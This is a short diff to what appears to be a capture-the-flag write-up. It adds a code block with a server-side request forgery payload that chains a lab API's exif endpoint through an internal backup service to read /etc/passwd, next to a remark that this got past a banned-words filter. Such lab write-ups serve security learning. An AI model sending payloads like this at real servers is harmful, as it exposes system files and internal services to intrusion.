@@ -147,6 +147,10 @@ http://api-dev-backup:8080/exif
 
 Calling the server url, then calling the internal port 8080 with a new URL paramater gave a different response to banned words. 
 
+```
+http://10.10.31.233/api/exif?url=http://api-dev-backup:8080/exif?url=/etc/passwd
+```
+
 ![image](https://user-images.githubusercontent.com/5285547/129357665-816ce4b1-a7d1-4643-b421-e7b0f8e34579.png)
 
 
